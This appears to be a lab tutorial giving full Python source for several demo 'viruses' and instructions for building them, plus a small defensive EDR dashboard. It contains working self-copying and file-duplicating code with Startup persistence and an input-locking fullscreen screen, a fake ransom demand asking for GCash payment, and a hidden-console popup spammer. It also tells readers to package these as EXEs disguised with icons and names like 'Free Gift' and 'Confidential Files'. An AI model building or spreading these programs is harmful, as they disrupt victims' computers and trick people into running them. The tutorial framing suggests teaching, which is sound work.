## MALWARE

### Step 2: Setup your Virtual Environment

To activate:
```bash 
python -m venv venv
```

```bash
venv\Scripts\activate
```
 ### Step 3: Install Required Libraries

```bash
pip install pygame
```

### Step 4: infecto.py

```bash
import os, shutil, random, time, datetime, tkinter as tk, pygame
from threading import Thread

# ===== CONFIG =====
TARGET_DIRS = [
    os.path.expanduser("~/Desktop"),
    os.path.expanduser("~/Documents"),
    "C:\\Temp"
]
FAKE_EXT = ".infected"
ALARM_FILE = os.path.join(os.path.dirname(__file__), "alert.wav")
SIM_DURATION = 20
SAVE_DIR = os.path.expanduser("~/Desktop")  # infection_log.txt will be saved here
# ==================

log = []

def log_event(event, box=None):
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    entry = f"[{ts}] {event}"
    log.append(entry)
    print(entry)
    if box:
        box.insert(tk.END, entry + "\n")
        box.see(tk.END)

def save_log():
    """Save IOC log to Desktop after infection ends"""
    try:
        fname = os.path.join(SAVE_DIR, "infection_log.txt")
        with open(fname, "w") as f:
            for entry in log:
                f.write(entry + "\n")
        print(f"[+] Infection log saved at: {fname}")
    except Exception as e:
        print(f"[!] Could not save log: {e}")

def spread_self(log_box=None):
    exe_path = os.path.abspath(__file__)
    for d in TARGET_DIRS:
        try:
            os.makedirs(d, exist_ok=True)
            target = os.path.join(d, f"win_patch_{random.randint(1000,9999)}.py")
            shutil.copy(exe_path, target)
            log_event(f"Copied to {target}", log_box)
        except Exception as e:
            log_event(f"Spread failed: {e}", log_box)

def infect_files(log_box=None):
    for d in TARGET_DIRS:
        try:
            for fname in os.listdir(d):
                fpath = os.path.join(d, fname)
                if os.path.isfile(fpath) and not fpath.endswith(FAKE_EXT):
                    infected = fpath + FAKE_EXT
                    shutil.copy(fpath, infected)
                    log_event(f"File infected: {infected}", log_box)
        except:
            pass

def simulate_persistence(log_box=None):
    try:
        startup = os.path.join(os.getenv("APPDATA"), r"Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        os.makedirs(startup, exist_ok=True)
        dummy = os.path.join(startup, "startup_infect.bat")
        with open(dummy, "w") as f:
            f.write("echo Fake persistence simulation - no real damage.")
        log_event(f"Persistence simulated at: {dummy}", log_box)
    except Exception as e:
        log_event(f"Persistence failed: {e}", log_box)

def play_alert():
    try:
        pygame.mixer.init()
        pygame.mixer.music.load(ALARM_FILE)
        pygame.mixer.music.play(-1)
        print(f"[+] Playing sound from {ALARM_FILE}")
    except Exception as e:
        log_event(f"Alert sound error: {e}")

# --- Fullscreen infection GUI ---
def infection_screen():
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.configure(bg="black")
    root.wm_attributes("-topmost", 1)

    # disable exit + keyboard
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.bind_all("<Key>", lambda e: "break")
    root.bind_all("<Alt-Key>", lambda e: "break")

    warning = tk.Label(
        root,
        text="⚠️ YOUR PC HAS BEEN INFECTED ⚠️",
        fg="red",
        bg="black",
        font=("Consolas", 42, "bold")
    )
    warning.place(relx=0.5, rely=0.3, anchor="center")

    submsg = tk.Label(
        root,
        text="Do not turn off your computer.\nFiles are being corrupted...",
        fg="yellow",
        bg="black",
        font=("Consolas", 20)
    )
    submsg.place(relx=0.5, rely=0.42, anchor="center")

    log_box = tk.Text(root, height=15, width=95, bg="black", fg="lime", font=("Consolas", 12))
    log_box.place(relx=0.5, rely=0.75, anchor="center")

    # Animation vars
    direction = 1
    y_pos = 0.3
    start_time = time.time()

    while time.time() - start_time < SIM_DURATION:
        # Move the red warning up and down
        y_pos += 0.003 * direction
        if y_pos > 0.35 or y_pos < 0.25:
            direction *= -1
        warning.place(relx=0.5, rely=y_pos, anchor="center")

        # Fake infection events
        if random.random() < 0.25:
            fake_event = random.choice([
                "Injected into explorer.exe",
                "Modified registry key HKCU\\Run",
                "Spawned process: svchost32.exe",
                "Spreading to Documents folder",
                "Memory hook installed"
            ])
            log_event(fake_event, log_box)

        root.update()
        time.sleep(0.2)

    root.destroy()
    save_log()  

# --- MAIN ---
def main():
    Thread(target=spread_self, daemon=True).start()
    Thread(target=infect_files, daemon=True).start()
    Thread(target=simulate_persistence, daemon=True).start()
    Thread(target=play_alert, daemon=True).start()
    infection_screen()

if __name__ == "__main__":
    main()

```

## Creating a EXE FILE
#### 1. Convert Script to EXE

Prepare the Icon

#### Go to: https://www.iconarchive.com/
##### Download and Rename the file (example: infecto.ico).
##### Move it to the same folder as your infecto.py.
##### Take note: whatever you name the .ico file is what you must also put in the PyInstaller command.

Paste this: 
```bash
pip install pyinstaller
```
```bash
pyinstaller --onefile --windowed --icon=infecto.ico infecto.py
```
#### 2. Create the Desktop Shortcut
- Right-click Desktop → New → Shortcut
- Browse to: C:\Users\Administrator\Downloads\LAB\InfectoV\dist\infecto.exe
- Right-click the shortcut → Properties → Change Icon
- Select your infecto.ico.

# Ransomware

## Install PyInstaller
```bash
 pip install pyinstaller
```
## Ransom.py
```bash
import os, random, time, datetime, tkinter as tk, pygame
from threading import Thread
from PIL import Image, ImageTk

# ===== CONFIG =====
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
VICTIM_ID, SIM_DURATION = f"GC-{random.randint(10000,99999)}", 60
ALARM_FILE = os.path.join(BASE_DIR, "Alert2.wav")
QR_FILE = os.path.join(BASE_DIR, "qr.jpg")
# ==================

def play_alert():
    try:
        if os.path.exists(ALARM_FILE):
            pygame.mixer.init()
            pygame.mixer.music.load(ALARM_FILE)
            pygame.mixer.music.play(-1)
        else:
            print(f"[!] Sound missing: {ALARM_FILE}")
    except Exception as e:
        print(f"[!] Sound error: {e}")

def ransom_gui():
    root = tk.Tk()
    root.title("Wana Decrypt0r Simulator 2.0")
    root.geometry("720x540")
    root.resizable(False, False)
    root.configure(bg="#b30000")   # deep red background
    root.wm_attributes("-topmost", 1)

    # ===== HEADER =====
    header = tk.Frame(root, bg="#b30000", height=70)
    header.pack(fill="x")
    tk.Label(header, text="Ooops, your files have been encrypted!",
             fg="white", bg="#b30000", font=("Segoe UI", 20, "bold")).pack(pady=15)

    # ===== MAIN LAYOUT =====
    body = tk.Frame(root, bg="#f4f4f4", padx=10, pady=10)
    body.pack(fill="both", expand=True)

    # LEFT PANEL (Warnings + Countdown)
    left = tk.Frame(body, bg="#990000", width=220, padx=8, pady=8)
    left.pack(side="left", fill="y")

    # Payment raise panel
    tk.Label(left, text="Payment will be raised on:", bg="#990000", fg="white",
             font=("Segoe UI", 11, "bold")).pack(pady=5)
    raise_lbl = tk.Label(left, text="--/--/----", bg="black", fg="lime",
                         font=("Consolas", 14, "bold"), width=18, height=2)
    raise_lbl.pack(pady=5)

    # Files lost panel
    tk.Label(left, text="Your files will be lost on:", bg="#990000", fg="white",
             font=("Segoe UI", 11, "bold")).pack(pady=15)
    lost_lbl = tk.Label(left, text="--/--/----", bg="black", fg="red",
                        font=("Consolas", 14, "bold"), width=18, height=2)
    lost_lbl.pack(pady=5)

    # ===== RIGHT PANEL (Info + QR) =====
    right = tk.Frame(body, bg="#f4f4f4")
    right.pack(side="left", fill="both", expand=True, padx=10)

    # Victim ID
    tk.Label(right, text=f"Victim ID: {VICTIM_ID}", font=("Consolas", 12), bg="#f4f4f4").pack(anchor="w")

    # Instructions
    instr = ("What Happened to My Computer?\n\n"
             "All your important files are encrypted.\n"
             "To restore access, you must pay ₱5,000 via GCash.\n\n"
             "Can I Recover My Files?\n\n"
             "Sure. You can recover files safely, but only after payment.\n\n"
             "How Do I Pay?\n\n"
             "Payment is accepted in GCash. Scan the QR below and send the amount.\n")
    tk.Message(right, text=instr, width=400, bg="#f4f4f4", font=("Segoe UI", 10)).pack(anchor="w", pady=5)

    # QR Image
    if os.path.exists(QR_FILE):
        qr = ImageTk.PhotoImage(Image.open(QR_FILE).resize((200,200)))
        tk.Label(right, image=qr, bg="#f4f4f4").pack(pady=10)
        right.qr_img = qr
    else:
        tk.Label(right, text="[QR MISSING]", fg="red", bg="#f4f4f4").pack(pady=10)

    # Payment details
    pay_frame = tk.Frame(right, bg="#ffcc00", padx=10, pady=5)
    pay_frame.pack(fill="x", pady=10)
    tk.Label(pay_frame, text="Send ₱5,000 worth to this GCash QR!", bg="#ffcc00",
             fg="black", font=("Consolas", 11, "bold")).pack()

    # ===== FOOTER (Countdown + Buttons) =====
    footer = tk.Frame(root, bg="#b30000", height=50)
    footer.pack(side="bottom", fill="x")

    countdown_lbl = tk.Label(footer, text="Time Left: -- sec", fg="white", bg="#b30000",
                             font=("Consolas", 16, "bold"))
    countdown_lbl.pack(pady=5)

    def update_countdown():
        start = time.time()
        while time.time() - start < SIM_DURATION:
            left = int(SIM_DURATION - (time.time() - start))
            countdown_lbl.config(text=f"Time Left: {left} sec")
            raise_lbl.config(text="08/26/2025 10:00 AM ")
            lost_lbl.config(text="08/26/2025 10:10 AM")
            root.update()
            time.sleep(1)
        root.destroy()

    Thread(target=update_countdown, daemon=True).start()
    root.mainloop()

def main():
    Thread(target=play_alert, daemon=True).start()
    ransom_gui()

if __name__ == "__main__":
    main()
```

# EDR

### Install libraries
```bash
pip install psutil matplotlib
```

### edr_lite.py
```bash
import psutil, tkinter as tk, datetime, os
from tkinter import ttk, messagebox
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
import matplotlib.pyplot as plt

# ===== CONFIG =====
REFRESH = 2000
SUSPICIOUS = ["mimikatz.exe","wannacry.exe","netcat.exe","meterpreter.exe"]
DESKTOP_DIR = os.path.join(os.path.expanduser("~"), "Desktop")
# ==================

def save_report(process_list, net_list):
    if not os.path.exists(DESKTOP_DIR):
        os.makedirs(DESKTOP_DIR)

    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"edr_report_{timestamp}.txt"
    filepath = os.path.join(DESKTOP_DIR, filename)

    with open(filepath, "w") as f:
        f.write("=== EDR-lite Snapshot Report ===\n")
        f.write(f"Generated: {datetime.datetime.now()}\n\n")
        f.write("--- Processes ---\n")
        for p in process_list: f.write(p+"\n")
        f.write("\n--- Network Connections ---\n")
        for n in net_list: f.write(n+"\n")

    messagebox.showinfo("Export Complete", f"IOC snapshot saved:\n{filepath}")
    print(f"[+] Report saved: {filepath}")

def get_processes():
    procs=[]
    for p in psutil.process_iter(['pid','name','cpu_percent','memory_percent']):
        try:
            if p.info['name'].lower()!="system idle process": procs.append(p.info)
        except: pass
    return procs

def get_connections():
    conns=[]
    for c in psutil.net_connections(kind='inet'):
        if c.raddr:
            conns.append({"l":f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else "?",
                          "r":f"{c.raddr.ip}:{c.raddr.port}","s":c.status})
    return conns

def update_process_tab():
    proc_box.delete(1.0,tk.END); plist=[]
    for p in get_processes():
        line=f"{p['pid']:5} | {p['name'][:25]:25} | CPU:{p['cpu_percent']:5.1f}% | MEM:{p['memory_percent']:5.1f}%"
        color="black"
        if p['name'].lower() in SUSPICIOUS: color="red"; line+="  <== SUSPICIOUS"
        proc_box.insert(tk.END,line+"\n",color); proc_box.tag_config(color,foreground=color)
        plist.append(line)
    return plist

def update_network_tab():
    net_box.delete(1.0,tk.END); nlist=[]
    for c in get_connections():
        line=f"{c['l']:25} -> {c['r']:25} | {c['s']}"
        if c['r'].startswith(("192.168.","127.")): color="green"
        elif "WAIT" in c['s']: color="orange"
        else: color="red"
        net_box.insert(tk.END,line+"\n",color); net_box.tag_config(color,foreground=color)
        nlist.append(line)
    return nlist

def update_charts():
    ax1.clear()
    cpu,mem=psutil.cpu_percent(),psutil.virtual_memory().percent
    bars=ax1.bar(["CPU","Memory"],[cpu,mem],color=["blue","purple"])
    ax1.set_ylim(0,100); ax1.set_title("System Resource Summary")
    ax1.bar_label(bars,fmt="%.1f%%"); ax1.grid(True,linestyle="--",alpha=0.5)
    canvas1.draw()

    ax2.clear()
    procs=sorted(get_processes(),key=lambda p:p['memory_percent'],reverse=True)[:5]
    names=[p['name'][:12] for p in procs]; mem=[p['memory_percent'] for p in procs]
    bars=ax2.barh(names,mem,color="teal")
    ax2.set_title("Top 5 Processes by Memory Usage"); ax2.set_xlabel("Memory %")
    ax2.bar_label(bars,fmt="%.1f%%"); ax2.grid(True,linestyle="--",alpha=0.5)
    canvas2.draw()

def update_all():
    global last_processes, last_network
    last_processes = update_process_tab()
    last_network = update_network_tab()
    update_charts()
    root.after(REFRESH,update_all)

# ==== GUI ====
root=tk.Tk(); root.title("🛡️ Blue Team EDR-lite Pro Dashboard"); root.geometry("1200x800")

notebook=ttk.Notebook(root); notebook.pack(fill="both",expand=True)

# --- Tab 1: Processes ---
tab1=tk.Frame(notebook,bg="white"); notebook.add(tab1,text="Processes")
proc_box=tk.Text(tab1,height=30,width=120,bg="#f5f5f5",fg="black",font=("Consolas",10))
proc_box.pack(fill="both",expand=True,padx=10,pady=10)

# --- Tab 2: Network ---
tab2=tk.Frame(notebook,bg="white"); notebook.add(tab2,text="Network")
net_box=tk.Text(tab2,height=30,width=120,bg="#f5f5f5",fg="black",font=("Consolas",10))
net_box.pack(fill="both",expand=True,padx=10,pady=10)

# --- Tab 3: Charts ---
tab3=tk.Frame(notebook,bg="white"); notebook.add(tab3,text="Charts")
fig1,ax1=plt.subplots(figsize=(5,3),dpi=100); canvas1=FigureCanvasTkAgg(fig1,master=tab3)
canvas1.get_tk_widget().pack(fill="x",padx=10,pady=10)
fig2,ax2=plt.subplots(figsize=(5,3),dpi=100); canvas2=FigureCanvasTkAgg(fig2,master=tab3)
canvas2.get_tk_widget().pack(fill="x",padx=10,pady=10)

# --- Tab 4: Reports ---
tab4=tk.Frame(notebook,bg="white"); notebook.add(tab4,text="Reports")
tk.Label(tab4,text="Export IOC Snapshot",font=("Segoe UI",14,"bold"),bg="white").pack(pady=20)
tk.Button(tab4,text="📤 Export IOC Now",
          command=lambda: save_report(last_processes,last_network),
          bg="black",fg="white",font=("Segoe UI",12,"bold")).pack()

last_processes,last_network=[],[]
update_all(); root.mainloop()
```



### VIRUS: Fake_error.py

pip install win32gui

```bash
import random
import time
import win32gui
import win32con
import ctypes
import sys
from threading import Thread

# ===== CONFIG =====
MAX_SPEED = True          # Set to False for less aggressive spamming
HIDE_CONSOLE = True      # Run completely in background
# ==================


ERROR_MESSAGES = [
    "CRITICAL SYSTEM FAILURE: Hoy, magbayad ka na ng utang mo!",
    "VIRUS ALERT: May balance ka pa sa utang mo!",
    "BSOD IMMINENT: 0x0000007B Mabagal ang iyong PC",
    "ERROR: Kulang ka sa tulog at pagmamahal.",
    "WARNING: Nag-ooverheat na CPU mo.",
    "ALERT: Puno na ang memory, i-delete mo na mga screenshot ng ex mo!",
    "SYSTEM32 DELETION IN PROGRESS: 37% complete",
    "CRITICAL: Kailangan ko ng pera, pera, pera",
    "ERROR: May virus na galing sa pag-download ng 'FreeIphone.exe'!",
    "404: Utang na loob, bayaran mo na!",
    "ALERT:  Naubos ang RAM kasi bukas lahat ng tabs ng Chrome!",
    "FATAL ERROR: Storage full, i-delete mo na yung 100 selfies sa jeep!",
]

def show_error():
    """Shows a fake error message"""
    title = random.choice([
        "Microsoft Windows",
        "System Alert",
        "CRITICAL ERROR",
        "Virus Protection",
        "IT Department"
    ])
    
    style = random.choice([
        win32con.MB_ICONERROR | win32con.MB_SYSTEMMODAL,
        win32con.MB_ICONWARNING | win32con.MB_SYSTEMMODAL,
        win32con.MB_ICONINFORMATION | win32con.MB_SYSTEMMODAL
    ])
    
    win32gui.MessageBox(
        0,
        random.choice(ERROR_MESSAGES),
        title,
        style
    )

def hide_console():
    """Completely hides the console window"""
    ctypes.windll.user32.ShowWindow(
        ctypes.windll.kernel32.GetConsoleWindow(),
        0
    )

def main():
    if HIDE_CONSOLE:
        hide_console()
    
    # Calculate delay based on intensity
    delay = 0.1 if MAX_SPEED else random.uniform(0.5, 1.5)
    
    # Main spamming loop
    while True:
        try:
            # Spawn multiple error threads for maximum chaos
            for _ in range(random.randint(1, 3 if MAX_SPEED else 1)):
                Thread(target=show_error).start()
            
            time.sleep(delay)
        except:
            pass

if __name__ == "__main__":
    # Make sure only one instance runs
    try:
        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "FakeErrorMutex")
        if ctypes.windll.kernel32.GetLastError() == 183:
            sys.exit()
        
        main()
    finally:
        if 'mutex' in locals():
            ctypes.windll.kernel32.CloseHandle(mutex)
```

Run it:
```bash
python fake_error.py
```

Creating a Clickable Desktop Icon
#### #1 Convert Script to EXE

- Navigate to this link: https://www.iconarchive.com/
- Search your desired icon. For example: winrar
- Click All Downloads Format
- Choose Windows: Download ICO
- Rename the file into winrar
- Move the winrar.ico to your folder

In your terminal, paste this:
```bash
pip install pyinstaller
pyinstaller --onefile --windowed --icon=error.ico fake_error.py
```
#### #2 Create the Desktop Shortcut
- Right-click desktop → New → Shortcut
- Browse to: C:\Users\Administrator\Downloads\malware\virus3\dist\fake_error.exe
- Name it "Confidential Files"

# Virus 3 Infinite Folder

### Step 1: Inside the malware folder add a new folder (vs code) name it virus3

### Step 2: Setup your Virtual Environment
Open vs code and in the terminal move out of directory:
```bash
cd ..
```
```bash
cd virus3
````
Install Required Library
```bash
pip install pywin32
```

### Step 3: infinitefolder_prank.py.

```bash
import os
import time
import shutil
from threading import Thread

# ===== CONFIG =====
FOLDER_NAME = "FOLDER_INVASION"    # Name of the main folder
DELAY_SECONDS = 0.3                # Speed of appearance (0.3s is optimal)
TOTAL_FOLDERS = 50                 # Total folders to create (stops automatically)
# ==================

def get_desktop_path():
    """Get the correct Desktop path (works with OneDrive too)"""
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    if not os.path.exists(desktop):
        desktop = os.path.join(os.path.expanduser("~"), "OneDrive", "Desktop")
    return desktop

def create_visible_folders():
    """Creates folders that visibly appear on Desktop"""
    desktop = get_desktop_path()
    root_path = os.path.join(desktop, FOLDER_NAME)
    
    # Clear previous run if exists
    if os.path.exists(root_path):
        shutil.rmtree(root_path)
    
    # Create initial folder
    os.makedirs(root_path)
    
    # Create nested folders
    current_path = root_path
    for i in range(1, TOTAL_FOLDERS + 1):
        current_path = os.path.join(current_path, f"FOLDER_{i}")
        os.makedirs(current_path)
        
        # Force folder refresh on Windows
        if os.name == 'nt':
            os.system(f'explorer /select,"{current_path}"')
        
        print(f"Created: {current_path}")  # Console log
        time.sleep(DELAY_SECONDS)

if __name__ == "__main__":
    print("\n=== VISIBLE FOLDER PRANK ===")
    print(f"Creating {TOTAL_FOLDERS} folders on Desktop...\n")
    print("Watch them appear in real-time!")
    print("Press CTRL+C to stop early\n")
    
    try:
        create_visible_folders()
    except KeyboardInterrupt:
        print("\nStopped by user!")
    finally:
        print(f"\nDone! Check your Desktop for '{FOLDER_NAME}'")
        print("To delete: Right-click the folder and select 'Delete'")
```

Run it:
```bash
python infinitefolder_prank.py
```
Creating a Clickable Desktop Icon
#### #1 Convert Script to EXE

- Navigate to this link: https://www.iconarchive.com/
- Search your desired icon. For example: gift
- Click All Downloads Format
- Choose Windows: Download ICO
- Rename the file into gift
- Move the gift.ico to your folder

In your terminal, paste this:
```bash
pip install pyinstaller
pyinstaller --onefile --windowed --icon=gift.ico infinitefolder_prank.py
```
#### #2 Create the Desktop Shortcut
- Right-click desktop → New → Shortcut
- Browse to: C:\Users\Administrator\Downloads\malware\virus2\dist\infinitefolder_prank.exe
- Name it "Free Gift"

